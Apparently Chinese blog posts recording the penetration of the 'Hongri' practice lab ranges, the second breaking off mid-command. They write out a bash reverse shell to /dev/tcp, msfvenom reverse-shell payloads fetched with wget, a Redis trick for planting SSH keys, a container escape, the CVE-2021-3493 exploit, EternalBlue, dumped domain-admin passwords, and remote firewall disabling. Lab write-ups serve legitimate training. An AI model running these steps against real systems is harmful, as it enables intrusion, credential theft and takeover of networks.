href="https://github.com/BeichenDream/Godzilla%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80![img](https://api2.mubu.com/v3/document_image/0da58803-a684-4754-8074-e948169b698d-11763069.jpg)">https://github.com/BeichenDream/Godzilla下载地址![img](https://api2.mubu.com/v3/document_image/0da58803-a684-4754-8074-e948169b698d-11763069.jpg)</a></li></ul></li><li><p>连上shell<img src="https://api2.mubu.com/v3/document_image/78756e96-47c7-4cb8-b923-e9aeef82a494-11763069.jpg" alt="img"></p></li><li><p>首先判断当前环境和权限  发现有些命令无法执行 怀疑是在容器里面</p></li><li><p>判断是否为docker<img src="https://api2.mubu.com/v3/document_image/b1e6a315-d306-4a61-9e57-ddbe15673d57-11763069.jpg" alt="img"></p></li><li><p>确实是在docker里面  所以就需要进行docker逃逸</p></li><li><p>但是当前权限较低<img src="https://api2.mubu.com/v3/document_image/a7ca5173-823c-4dee-b3e5-78f8e7b2c218-11763069.jpg" alt="img"></p></li><li><p>所以需要进行提权 先通过命令来搜索具有SUID或4000权限的文件：</p><ul><li>find / -perm -u=s -type f 2&gt;/dev/null<img src="https://api2.mubu.com/v3/document_image/e280d9c1-1dcb-4c2a-87c3-75578f8aef60-11763069.jpg" alt="img"></li></ul></li><li><p>发现 /home/jobs/shell 文件比较特别  然后切换到目录看看 </p></li><li><p>但是发现在哥斯拉执行的时候切换不了 不知道什么情况 那就先弹个会话到kali</p><ul><li>命令：bash -c “bash -i &gt;&amp; /dev/tcp/192.168.43.35/1234 0&gt;&amp;1”</li></ul></li><li><p>然后在kali上试试能不能行<img src="https://api2.mubu.com/v3/document_image/6cf4aac4-9164-4005-900d-36ca6ab2c56c-11763069.jpg" alt="img"></p></li><li><p>然后通过查看demo.c文件发现 是调用的ps命令且并未使用绝对路径<img src="https://api2.mubu.com/v3/document_image/d3a264f7-1916-478a-af08-05bfe78a23c6-11763069.jpg" alt="img"></p></li><li><p>那么尝试更改$PATH来执行恶意程序，从而获得目标主机的 root 权限 shell</p><ul><li><p>cd /tmp</p></li><li><p>echo “/bin/bash” &gt; ps</p></li><li><p>chmod 777 ps</p></li><li><p>echo $PATH</p></li><li><p>export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序</p></li><li><p>cd /home/jobs</p></li><li><p>./shell# 然后就获得了root权限，可以执行命令了</p></li></ul></li><li><p>然后先弹个root的会话<img src="https://api2.mubu.com/v3/document_image/46df80e3-c622-4a2d-921b-1e195cd654c1-11763069.jpg" alt="img"></p></li><li><p>然后使用特权模式进行docker逃逸</p><ul><li><p>先fdisk -l查看磁盘挂载<img src="https://api2.mubu.com/v3/document_image/8150dc0b-8819-462e-97d2-7c2aaefdfd89-11763069.jpg" alt="img"></p></li><li><p>sda1盘疑似挂载于宿主机上，利用mount挂载于我们创建的目录之上<img src="https://api2.mubu.com/v3/document_image/345a0738-4500-4f0a-a414-2e980f86cbc8-11763069.jpg" alt="img"></p></li><li><p>然后ls hack就可以看到宿主机部分文件<img src="https://api2.mubu.com/v3/document_image/d6cf4391-335a-40dc-8bcf-5cabb4e4bce7-11763069.jpg" alt="img"></p></li><li><p>来到/hack/home/ubuntu下 可以看到有.ssh文件<img src="https://api2.mubu.com/v3/document_image/43dd5919-f695-4f38-ba20-bff005a23c1a-11763069.jpg" alt="img"></p></li><li><p>那就可以写入密钥</p></li><li><p>先在kali中生成密钥  创建一个key文件<img src="https://api2.mubu.com/v3/document_image/404f1c8f-af9c-4103-b671-e244711e3722-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/d758c35f-8167-4a8e-814f-bcfda4ebc79e-11763069.jpg" alt="img"></p></li><li><p>然后将密钥复制</p></li><li><p>然后写入目标的.ssh目录下<img src="https://api2.mubu.com/v3/document_image/08240270-a730-4788-abb3-9b25ec86598c-11763069.jpg" alt="img"></p></li><li><p>命令：cp -avx /hack/home/ubuntu/.ssh/id_rsa.pub /hack/home/ubuntu/.ssh/authorized_keys(我这里是切换到.ssh目录下复制的 因为我直接全路径不知道为什么失败)(后来发现是hack前面不需要/)</p></li><li><p>然后写入到authorized_keys里面<img src="https://api2.mubu.com/v3/document_image/3dd70c5a-6e2f-4efe-887d-bf7797d28e5e-11763069.jpg" alt="img"></p></li><li><p>然后用kali连接ubuntu</p></li><li><p>但是发现还是需要密码 这就奇怪了<img src="https://api2.mubu.com/v3/document_image/7d9ca86d-79da-48e6-bf4f-eb4a176cffc7-11763069.jpg" alt="img"></p></li><li><p>然后换思路 因为发现还有6379 有redis 所以从redis搞</p></li></ul></li><li><p>redis未授权</p><ul><li><p>先安装redis-cli工具</p><ul><li><p>wget <a href="http://download.redis.io/redis-stable.tar.gz">http://download.redis.io/redis-stable.tar.gz</a></p></li><li><p>tar -zxvf redis-stable.tar.gz</p></li><li><p>cd redis-stable</p></li><li><p>make //全局生效 </p></li><li><p>cp src/redis-cli /usr/bin/</p></li></ul></li><li><p>然后连接</p><ul><li>redis-cli -h 192.168.43.129<img src="https://api2.mubu.com/v3/document_image/ddbf17f9-6b08-421f-943d-56c93d24988d-11763069.jpg" alt="img"></li></ul></li><li><p>尝试用redis写入ssh公钥</p><ul><li><p>kali生成ssh公钥</p><ul><li>ssh-keygen -t rsa</li></ul></li><li><p>将公钥导入key.txt文件(前后用\n换行，避免和Redis里其他缓存数据混合)，再把key.txt文件内容写入目标主机的redis缓冲里：</p><ul><li><p>(echo -e “\n\n”; cat /root/.ssh/id_rsa.pub; echo -e “\n\n”) &gt; key.txt</p></li><li><p>cat key.txt | redis-cli -h 192.168.43.129 -x set hello</p></li></ul></li><li><p>然后进入redis将公钥写入（这里redis要是不用root启，就不行）</p><ul><li><p>config set dir /root/.ssh                #设置redis的备份路径为/root/.ssh/</p></li><li><p>config set dbfilename authorized_keys    #设置保存文件名为authorized_keys</p></li><li><p>save        #将数据保存在目标服务器硬盘上</p></li><li><p>ssh 192.168.213.188                      #连接     <img src="https://api2.mubu.com/v3/document_image/58e81d3e-52e8-4498-9bf5-de8d9740be02-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/953b5607-78d6-492d-b7a7-da89a3d12a85-11763069.jpg" alt="img"></p></li><li><p>直接连上了</p></li></ul></li></ul></li></ul></li><li><p>docker逃逸失败的原因</p><ul><li><p>因为开始确确实实是把ssh公钥写入了 但是怎么会连不上哎 然后查看了下nginx的配置<img src="https://api2.mubu.com/v3/document_image/d3397343-245d-48d4-a485-8ac83face579-11763069.jpg" alt="img"></p></li><li><p>发现了 nginx 反向代理的标志 proxy_pass</p></li><li><p>攻击的机器192.168.43.129（192.168.52.10）服务器上的 nginx 将 81 端口收到的请求转发给了 192.168.52.20，将 80 端口收到的请求转发给了 <a href="http://whoamianony.top/">http://whoamianony.top</a></p></li><li><p>所以这个docker的宿主机的192.168.20.20上 就算公钥写进去了 但是连不上 不在同一个网段 那个是</p></li><li><p>如果说192.168.43.129(192.168.52.10)是A机器  192.168.52.20是B机器  docker是B1</p></li><li><p>那么我们开始用马子拿下的就是B中的B1  redis拿下的才是A </p></li></ul></li><li><p>docker再次逃逸（柳暗花明）</p><ul><li><p>还是先把这个上线msf 以便后续操作</p></li><li><p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.43.35 LPORT=3333 -f elf &gt; web.elf<img src="https://api2.mubu.com/v3/document_image/ae4a6dfb-37cb-4638-bd3a-90a808f6e17c-11763069.jpg" alt="img"></p></li><li><p>然后远程下载马子<img src="https://api2.mubu.com/v3/document_image/3837ff79-a495-4d49-bc70-5f2b2c80086b-11763069.jpg" alt="img"></p></li><li><p>然后msf开启监听</p><ul><li><p>use exploit/multi/handler</p></li><li><p>set lhost 192.168.31.96</p></li><li><p>set lport 3333</p></li><li><p>set payload linux/x86/meterpreter/reverse_tcp</p></li><li><p>run</p></li></ul></li><li><p>然后执行上线<img src="https://api2.mubu.com/v3/document_image/77a895b0-777d-4d34-a257-1ca4f8cad031-11763069.jpg" alt="img"></p></li><li><p>因为开始第一步我们就将公钥写进去192.168.50.20了  是不是我们可以直接将kali的公钥下载到拿下的A机器 然后直接连接  但是还是要输入密码 很奇怪 按道理我看网上的有人是可以成功的 这里我没成功 就不管了<img src="https://api2.mubu.com/v3/document_image/cbcf319a-8540-4a39-8fdd-a1616619ee41-11763069.jpg" alt="img"></p></li><li><p>然后我重新试了一下 还是成功连上了  可能是因为我第一天关机了原因  <img src="https://api2.mubu.com/v3/document_image/440f5e8a-476f-4f30-8bde-cd1b3db0a12f-11763069.jpg" alt="img"></p></li><li><p>重新通过第一步的shell写密钥到192.168.52.20上 然后下载kali的公钥连接上了</p></li><li><p>这里既然连接上了 就不用另一种方法了</p></li><li><p>但还是介绍一下另一种方法</p></li><li><p>我们通过redis拿下了192.168.43.129(192.168.52.10)这一台  这一台和192.168.52.20 有共同的网段的是可以直接连的   所以就可以通过shell弹一个会话到43.129这一台机器上 然后在这一台机器上进行docker提权以及 特权模式逃逸  直接在129这一台机器上生成密钥 然后写入到52.20中 然后连接进行逃逸</p></li></ul></li><li><p>所以到现在已经拿下了两台</p><ul><li><p>拿到了web，192.168.43.129；192.168.52.10</p></li><li><p>拿到了ubuntu，192.168.52.20；192.168.93.10</p></li></ul></li><li><p>但192.168.52.20是ubuntu用户权限不高 我们要得肯定是root最好 先进行信息收集看看能不能提权<img src="https://api2.mubu.com/v3/document_image/44ee80bb-7863-4db2-b671-216145e2205a-11763069.jpg" alt="img"></p></li><li><p>14.04 刚好上次打靶场的时候遇到 这个版本可以提权用<a href="https://github.com/briskets/CVE-2021-3493">CVE-2021-3493</a></p></li><li><p>漏洞利用 exp 下载地址：<a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p></li><li><p>漏洞影响版本：</p><ul><li><p>Ubuntu 20.10</p></li><li><p>Ubuntu 20.04 LTS</p></li><li><p>Ubuntu 18.04 LTS</p></li><li><p>Ubuntu 16.04 LTS</p></li><li><p>Ubuntu 14.04 ESM</p></li></ul></li><li><p>直接将下载的exp的内容复制到 这台机器编译一个</p><ul><li><p>cd /tmp</p></li><li><p>vim exploit.c             #将下载的exploit.c内容粘贴到该文件中</p></li><li><p>gcc exploit.c -o exploit</p></li><li><p>chmod +x exploit</p></li><li><p>./exploit<img src="https://api2.mubu.com/v3/document_image/8d4f132a-7877-4c3a-ba4e-1797418f1ecc-11763069.jpg" alt="img"></p></li><li><p>提权成功  然后现在上线msf进行内网渗透</p></li></ul></li><li><p>先添加一个路由 这台是192.168.43.129<img src="https://api2.mubu.com/v3/document_image/93e263a0-d090-47a2-bb42-01d28ede90fb-11763069.jpg" alt="img"></p></li><li><p>然后生成一个马子 </p><ul><li><p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.43.35 LPORT=4445 -f elf &gt; ubuntu.elf</p></li><li><p>然后远程下载 发现是可以下载的 说明可以出网</p></li><li><p>如果这里不能出网的话就需要通过先把马子传到192.168.43.129上 然后在下载到52.20这一台上 这也的话 马子也需要重新生成 设置代理</p></li></ul></li><li><p>然后下载执行上线<img src="https://api2.mubu.com/v3/document_image/48b36eca-fea8-47f8-ae1c-ee639471ed27-11763069.jpg" alt="img"></p></li><li><p>好了现在都上线了 开启socks代理探测内网</p></li><li><h3 id="第二层内网渗透"><a href="#第二层内网渗透" class="headerlink" title="第二层内网渗透"></a>第二层内网渗透</h3><ul><li><p>首先扫描一下第二层网络（192.168.52.0/24）是否有存活 windows 主机</p><ul><li><p>use auxiliary/scanner/discovery/udp_probe</p></li><li><p>set rhosts 192.168.52.1-255</p></li><li><p>set threads 5</p></li><li><p>run<img src="https://api2.mubu.com/v3/document_image/b5bcc847-38ac-4ed6-adcd-66c7b6eb4433-11763069.jpg" alt="img"></p></li><li><p>发现了一台30的机器 </p></li></ul></li><li><p>直接挂socks 进一步探测信息</p><ul><li><p>use auxiliary/server/socks_proxy</p></li><li><p>set srvhost 192.168.43.35</p></li><li><p>set version 4a socks版本   </p></li><li><p> run    <img src="https://api2.mubu.com/v3/document_image/7dbe4a44-bdbe-4c3f-b862-28dc71692310-11763069.jpg" alt="img"></p></li></ul></li><li><p>发现有个8080端口 然后浏览器开启代理打开看看<img src="https://api2.mubu.com/v3/document_image/eb5e2224-3149-40e0-8425-149cfb28f0f1-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/98d547fe-caea-488a-9ca1-a74c67f8f342-11763069.jpg" alt="img"></p></li><li><p>发现是一个通达OA V11.3  然后直接通过exp直接上<img src="https://api2.mubu.com/v3/document_image/5df73035-fc26-4e73-b9aa-42c05db9fe70-11763069.jpg" alt="img"></p></li><li><p>上工具，这个工具有个坑，有个获取cookie的功能但是获取不了，只有自己去网页上粘cookie过来。成功获取到了shell       <img src="https://api2.mubu.com/v3/document_image/4ca31aad-7626-4f37-95f6-745395b306d0-11763069.jpg" alt="img"></p></li><li><p>然后上线msf </p><ul><li><p> use exploit/multi/script/web_delivery</p></li><li><p>set target 2</p></li><li><p>set payload windows/x64/meterpreter/reverse_tcp</p></li><li><p>set lhost 192.168.43.35</p></li><li><p>set lport 5555</p></li><li><p>run       <img src="https://api2.mubu.com/v3/document_image/2bd3d5c9-0dcd-4812-9c3d-fb708b68ff82-11763069.jpg" alt="img"></p></li><li><p>上线之后进行内网信息收集</p><ul><li><p>ipconfig /all   # 查看本机ip，所在域</p></li><li><p>route print     # 打印路由信息</p></li><li><p>net view        # 查看局域网内其他主机名</p></li><li><p>arp -a          # 查看arp缓存</p></li><li><p>net start       # 查看开启了哪些服务</p></li><li><p>net share       # 查看开启了哪些共享</p></li><li><p>net share ipc$  # 开启ipc共享</p></li><li><p>net share c$    # 开启c盘共享</p></li><li><p>net use \192.168.xx.xx\ipc$ “” /user:””    # 与192.168.xx.xx建立空连接</p></li><li><p>net use \192.168.xx.xx\c$ “密码” /user:”用户名”    # 建立c盘共享</p></li><li><p>dir \192.168.xx.xx\c$\user    # 查看192.168.xx.xx c盘user目录下的文件</p></li><li><p>net config Workstation    # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</p></li><li><p>net user                 # 查看本机用户列表</p></li><li><p>net user /domain         # 查看域用户</p></li><li><p>net localgroup administrators    # 查看本地管理员组（通常会有域用户）</p></li><li><p>net view /domain         # 查看有几个域</p></li><li><p>net user 用户名 /domain   # 获取指定域用户的信息</p></li><li><p>net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</p></li><li><p>net group 组名 /domain    # 查看域中某工作组</p></li><li><p>net time /domain           // 主域服务器会同时作为时间服务器</p></li><li><p>net group “domain admins” /domain  # 查看域管理员的名字</p></li><li><p>net group “domain computers” /domain  # 查看域中的其他主机名</p></li><li><p>net group “doamin controllers” /domain  # 查看域控制器（可能有多台）</p></li><li><p>net group “Enterprise Admins” /domain    // 查看域管理员组</p></li></ul></li><li><p>.<img src="https://api2.mubu.com/v3/document_image/7065b21d-d96d-4b5f-a4cc-f42aac5af9b5-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/444e20c9-a60f-43f8-a281-19b166eb8e87-11763069.jpg" alt="img"></p></li><li><p>综合上面收集的信息，我们可知，目标网络环境存在一个名为<a href="http://whoamianony.org/">whoamianony.org</a>的域环境，域控制器主机名为<a href="http://dc.whoamianony.org/">DC.whoamianony.org</a>，IP为192.168.93.30，域管理员为Administrator。</p></li><li><p>然后迁移到64进程上进行抓密码<img src="https://api2.mubu.com/v3/document_image/4866beb9-916f-45fe-a1d0-d73d929a67a4-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/8b19a4d7-b2d4-40e7-aa4a-b6ded4fc5bf5-11763069.jpg" alt="img"></p></li><li><p>成功抓到域用户和域管理员的密码</p><ul><li><p>bunny：Bunny2021</p></li><li><p>administrator：Whoami2021</p></li></ul></li></ul></li></ul></li><li><h3 id="第三层内网渗透"><a href="#第三层内网渗透" class="headerlink" title="第三层内网渗透"></a>第三层内网渗透</h3><ul><li><p>添加93网段的路由<img src="https://api2.mubu.com/v3/document_image/ccf7a2ba-f316-4f2a-909a-e8ff00aecc7c-11763069.jpg" alt="img"></p></li><li><p>然后探测93网段存活机器</p><ul><li><p>use auxiliary/scanner/smb/smb_version</p></li><li><p>set rhosts 192.168.93.1-255</p></li><li><p>set threads 5</p></li><li><p>run<img src="https://api2.mubu.com/v3/document_image/178ef4b6-eefb-4e39-962c-ae3d1713dbf4-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/ed565e15-527f-4b07-9f7f-c4ba004793a1-11763069.jpg" alt="img"></p></li></ul></li><li><p>发现两台存活的windows 分别为DC（192.168.93.30）和PC2（192.168.93.40）</p></li><li><p>先扫端口 通过扫端口发现都开了445  那就测一测永恒之蓝</p><ul><li><p>use exploit/windows/smb/ms17_010_eternalblue</p></li><li><p>set rhosts 192.168.93.40</p></li><li><p>set payload windows/x64/meterpreter/bind_tcp</p></li><li><p>set lport 8888</p></li><li><p>exploit<img src="https://api2.mubu.com/v3/document_image/1302f1e9-8d10-4002-97c1-63e52038d632-11763069.jpg" alt="img"></p></li></ul></li><li><p>直接弹回会话了<img src="https://api2.mubu.com/v3/document_image/5d0aab65-d974-494e-aad5-18d629ab6ae4-11763069.jpg" alt="img"></p></li><li><p>第四台拿下 现在只剩下域控了  既然前面抓到了域管的密码 直接用psexec登录得了</p><ul><li><p>use exploit/windows/smb/psexec</p></li><li><p>set rhosts 192.168.93.30</p></li><li><p>set SMBUser administrator</p></li><li><p>set SMBPass Whoami2021</p></li><li><p>set payload windows/meterpreter/bind_tcp</p></li><li><p>set rhost 192.168.93.30</p></li><li><p>run</p></li></ul></li><li><p>失败了，应该是开了防火墙的原因。</p></li><li><p>没关系，我们已经有了域控的密码了，就可以控制第二层网络的Windows 7远程关闭域控的防火墙了。首先控制第二层网络的Windows 7与域控建立ipc连接：</p><ul><li>net use \192.168.93.30\ipc$ “Whoami2021” /user:”Administrator”<img src="https://api2.mubu.com/v3/document_image/531f5605-1539-4ae8-9446-ac1d57c1b455-11763069.jpg" alt="img"></li></ul></li><li><p>连上了  然后来关防火墙</p><ul><li><p>sc \192.168.93.30 create unablefirewall binpath= “netsh advfirewall set allprofiles state off”</p></li><li><p>sc \192.168.93.30 start unablefirewall<img src="https://api2.mubu.com/v3/document_image/9b1cbc31-dac0-4304-b101-5ee0b6cef233-11763069.jpg" alt="img"></p></li></ul></li><li><p>然后在次尝试psexec<img src="https://api2.mubu.com/v3/document_image/80f8f656-3d33-46fb-953d-1a4116bd15d4-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/a8247a24-0583-4413-99cc-889ba16bd1ff-11763069.jpg" alt="img"></p></li><li><p>拿下域控 到此拿下了所有机器  </p></li><li><p>权限维持就不做了</p></li><li><p>后记 最后想了一下其他思路 因为第二层的网络是出网的所以可以直接上线cs 在cs上操作 也是可以的</p></li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>红日靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日4</title>
    <link href="/2021/10/30/%E7%BA%A2%E6%97%A54/"/>
    <url>/2021/10/30/%E7%BA%A2%E6%97%A54/</url>
    
    <content type="html"><![CDATA[<ul><li><h2 id="概念图"><a href="#概念图" class="headerlink" title="概念图"></a>概念图<img src="https://api2.mubu.com/v3/document_image/c5bc413d-e040-4255-a19c-0a061c6bea68-11763069.jpg" alt="img"></h2></li><li><p>直接开干</p></li><li><p>先进入ubuntu启动web</p></li><li><p>先开启3个环境<img src="https://api2.mubu.com/v3/document_image/717e8e04-f23e-4157-a8e4-ae6be7b5b865-11763069.jpg" alt="img"></p></li><li><p>命令：</p><ul><li><p>cd /home/ubuntu/Desktop/vulhub/struts2/s2-045</p></li><li><p>sudo docker-compose up -d</p></li><li><p>cd /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/</p></li><li><p>sudo docker-compose up -d</p></li><li><p>cd /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/</p></li><li><p>sudo docker-compose up -d</p></li></ul></li><li><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2></li><li><h3 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h3><ul><li><p>nmap扫描发现目标主机</p><ul><li><p>nmap -sS -T4 192.168.1.0/24 <img src="https://api2.mubu.com/v3/document_image/128352ed-b704-4125-ade4-80b1f303b4f9-11763069.jpg" alt="img"></p></li><li><p>发现目标：192.168.1.10 除了22端口 2001-2003全是web服务</p></li></ul></li></ul></li><li><h3 id="二、web入侵"><a href="#二、web入侵" class="headerlink" title="二、web入侵"></a>二、web入侵</h3><ul><li><p>1、Struts2框架漏洞Getshell</p><ul><li><p>先打开2001端口的web<img src="https://api2.mubu.com/v3/document_image/eae9428b-197b-46e0-9c8d-c77453a88545-11763069.jpg" alt="img"></p></li><li><p>是一个上传界面  </p></li><li><p>我们先随便上传一个文件</p></li><li><p>上传之后发现后缀是.action的<img src="https://api2.mubu.com/v3/document_image/c6a7e03f-9b0b-4b6e-bf5c-5e141ce226f8-11763069.jpg" alt="img"></p></li><li><p>推测是struts2框架</p></li><li><p>然后使用漏洞工具探测一波<img src="https://api2.mubu.com/v3/document_image/fae03b54-a190-47a5-bb42-f8fb59a5154c-11763069.jpg" alt="img"></p></li><li><p>发现存在漏洞 且可执行命令  用msf上线</p></li><li><p>先在kali上生成msf木马 然后开一个http服务 将马放在服务上 供目标远程下载 因为目标出网</p><ul><li><p>命令：</p><ul><li><p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.96 LPORT=6666 -f elf &gt; shell.elf</p></li><li><p>python -m SimpleHTTPServer 80</p></li></ul></li></ul></li><li><p>然后目标远程下载 执行下载命令</p><ul><li><p>命令：</p><ul><li>wget <a href="http://192.168.1.11/shell.elf">http://192.168.1.11/shell.elf</a></li></ul></li><li><p><img src="https://api2.mubu.com/v3/document_image/69a59434-c915-4672-94ac-22d313dea47d-11763069.jpg" alt="img"></p></li></ul></li><li><p>然后msf开启监听</p><ul><li><p>命令：</p><ul><li><p>use exploit/multi/handler</p></li><li><p>set lhost 0.0.0.0</p></li><li><p>set lport 6666</p></li><li><p>set payload linux/x86/meterpreter/reverse_tcp</p></li><li><p>run</p></li></ul></li></ul></li><li><p>然后在目标上执行shell.elf  先给权限<img src="https://api2.mubu.com/v3/document_image/64fe8287-bf41-4a96-8d6e-f575ae1805a6-11763069.jpg" alt="img"></p></li><li><p>然后执行<img src="https://api2.mubu.com/v3/document_image/6d0d4773-bd0e-4aaa-aa6e-c4607f85068e-11763069.jpg" alt="img"></p></li><li><p>然后kali 收到会话<img src="https://api2.mubu.com/v3/document_image/466511ea-a15a-43e7-8188-5832d0dd2a5d-11763069.jpg" alt="img"></p></li><li><p>发现是172开头的<img src="https://api2.mubu.com/v3/document_image/d0a84d94-6c60-4271-81d9-760d4a271974-11763069.jpg" alt="img"></p></li><li><p>怀疑是docker 先判断一波</p></li><li><p>用命令 cat  /proc/1/cgroup<img src="https://api2.mubu.com/v3/document_image/8b0c6830-d270-4059-981a-b2ff057b249b-11763069.jpg" alt="img"></p></li><li><p>判断docker方法：</p><ul><li><p>1、使用下面命令，查看是否存在 dockerrnv 文件  ls -alh /.dockerenv</p></li><li><p>2、查看系统进程的cgroup信息  cat /proc/1/cgroup</p></li></ul></li><li><p>确定是在docker中 所以进行docker逃逸</p></li></ul></li><li><p>2、Tomcat任意文件上传（CVE-2017-12615）Getshell</p><ul><li><p>打开2002端口  是一个tomcat页面 版本是8.5.19<img src="https://api2.mubu.com/v3/document_image/c9b6f85e-db58-4750-9c99-22c11e87b208-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/ccd220aa-b63c-4ac3-b2d7-b98c1529ac47-11763069.jpg" alt="img"></p></li><li><p>尝试put方法拿shell<img src="https://api2.mubu.com/v3/document_image/63c65591-4cb6-4ae6-8244-bcb3bc42ae7a-11763069.jpg" alt="img"></p></li><li><p>冰蝎连接<img src="https://api2.mubu.com/v3/document_image/cb8667e8-8c57-4228-8ff5-7b9c766990a7-11763069.jpg" alt="img"></p></li><li><p>成功getshell</p></li></ul></li><li><p>3、PhPMyadmin <code>CVE-2018-12613</code> Getshell</p><ul><li><p>访问2003端口 是一个phpmyadmin<img src="https://api2.mubu.com/v3/document_image/98ed543e-d6f8-4f36-8988-947f25d21a39-11763069.jpg" alt="img"></p></li><li><p>尝试日志文件Getshell</p><ul><li><p>尝试将general log改为yes，提醒我们没有权限,好吧，日志文件getshell这条路是行不通了<img src="https://api2.mubu.com/v3/document_image/117b947d-afc7-48c7-85cc-717258316ca5-11763069.jpg" alt="img"></p></li><li><p>利用百度搜索发现，phpmyadmin4.8.1后台存在漏洞CVE-2018-12613，利用Poc验证本服务器是否存在</p><ul><li><a href="http://192.168.1.10:2003/index.php?target=db_sql.php?/../../../../../../../../etc/passwd">http://192.168.1.10:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</a></li></ul></li><li><p>成功包含，存在此漏洞</p></li><li><p>漏洞利用</p><ul><li><p>1.利用SQL查询查询 select ‘<?php eval($_POST['cmd']);?>‘,将查询后的网页cookie</p></li><li><p>phpmyadmin:f29ab8338e5bebece0edf526c14416c4记录</p></li><li><p>2.包含Php-session文件getshell</p></li><li><p><img src="https://api2.mubu.com/v3/document_image/20e1f5fc-8fec-4305-b613-5ed5de08577e-11763069.jpg" alt="img"></p></li></ul></li></ul></li></ul></li></ul></li><li><h3 id="三、Docker逃逸"><a href="#三、Docker逃逸" class="headerlink" title="三、Docker逃逸"></a>三、Docker逃逸</h3><ul><li><p>利用fdisk -l 查看挂载盘<img src="https://api2.mubu.com/v3/document_image/576cf65f-db61-49f8-8213-7482fc8464e5-11763069.jpg" alt="img"></p></li><li><p>sda1盘疑似挂载于宿主机上，利用mount挂载于我们创建的目录之上</p></li><li><p>mkdir  shell</p></li><li><p>mount /dev/sda1  shell       </p></li><li><p>挂载成功，我们此时可以查看、修改宿主机的某些文件了。<img src="https://api2.mubu.com/v3/document_image/b4141f6c-6515-44cc-9cf3-34580824ebb8-11763069.jpg" alt="img"></p></li><li><p>写入ssh密钥进行docker逃逸</p><ul><li><p>先在kali中生成密钥  创建一个key文件<img src="https://api2.mubu.com/v3/document_image/312deac6-9689-4299-90c5-aa4fb74f1e50-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/b260adb4-0530-4fc2-86d3-efd98beb9643-11763069.jpg" alt="img"></p></li><li><p>然后将密钥复制</p></li><li><p>然后写入目标的.ssh目录下<img src="https://api2.mubu.com/v3/document_image/8b39a503-a8e6-4b65-a501-ec351459ae9b-11763069.jpg" alt="img"></p></li><li><p>命令：</p><ul><li><p>cp -avx /shell/home/ubuntu/.ssh/id_rsa.pub /shell/home/ubuntu/.ssh/authorized_keys</p></li><li><p>echo ‘ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDW0uc8noTdYQIrZo5ODN0AyB4tmZlTF8mwxeVxccWCxrUkVwjhcfcmGq3czbgncMUoYh5vB1jWZSnakVfc4pAx3Yg/G4HVKu1q0JkCqrz8c1VJOpQAWoVjw8gCXpBk1rizX5nS4lkHAfZVJ0gb4grTGK31F+vbhN3OLIqteyUN7kJzWvvhD/iUiEDqVFKzllXIZGTr+kZioZfSxCJEZuI6ARbRDnKM/YHcdlfy0k64bYwWquCV8jxZOC5CYGr9Q6gPEO17a1szkNyTOGWNYk/oDQ2UpOT/PjObE3xk8eQrqnZFHQL23vTou3XOXoSp0C3DEdkr8aYE5bGUoet5n82QzZZixxCQIpuRvtvLHCQlBMiJZEB97gtivFZJXbFxV1QJpbrQDO/Q+HZTGH4rZnFMADDjbFhtWlb/uQqkZr38/hX7JxI8oewZcTKrF7tgc3jE/R33c/8OqNoYdv7LKqP//m7CEVUFE99GH5N+I3H8z6bQnARRhQ/1jKYLmK4+jXk= root@kali’ &gt; /hack/home/ubuntu/.ssh/authorized_keys</p></li><li><p>cat /hack/home/ubuntu/.ssh/authorized_keys</p></li></ul></li><li><p>然后用kali连接ubuntu</p><ul><li>这里要注意连接的时候需要根据生成key时候的名字 hack<img src="https://api2.mubu.com/v3/document_image/d5e4a5f6-5d05-42df-b871-4b20e74485dc-11763069.jpg" alt="img"></li></ul></li></ul></li><li><p>ubuntu提权</p><ul><li><p>先查看版本<img src="https://api2.mubu.com/v3/document_image/0b57b0f1-21b2-477d-8bff-88a567231590-11763069.jpg" alt="img"></p></li><li><p>根据志哥的wp  发现有一个新的exp可以提权  CVE-2021-3493</p></li><li><p>   EXP下载地址：<a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p></li><li><p>影响版本</p><ul><li><p>Ubuntu 20.10</p></li><li><p>Ubuntu 20.04 LTS</p></li><li><p>Ubuntu 18.04 LTS</p></li><li><p>Ubuntu 16.04 LTS</p></li><li><p>Ubuntu 14.04 ESM</p></li></ul></li><li><p>编译并上传到服务器exp</p><ul><li><p>gcc exploit -o exp</p></li><li><p>python3 -m http.server 80</p></li><li><p>chmod 777 exp </p></li><li><p>./exp 失败…推测环境不一致导致编译后无法在目标主机环境运行，上传exploit.c，尝试在服务器上编译使用    <img src="https://api2.mubu.com/v3/document_image/8104228c-7cb4-4b59-ad21-8b02505563ad-11763069.jpg" alt="img"></p></li><li><p> <a href="http://192.168.1.11/exploit.c">http://192.168.1.11:80/exploit.c</a><img src="https://api2.mubu.com/v3/document_image/e65c87f4-15a9-452c-af25-145c6be53472-11763069.jpg" alt="img"></p></li><li><p>gcc exploit.c -o 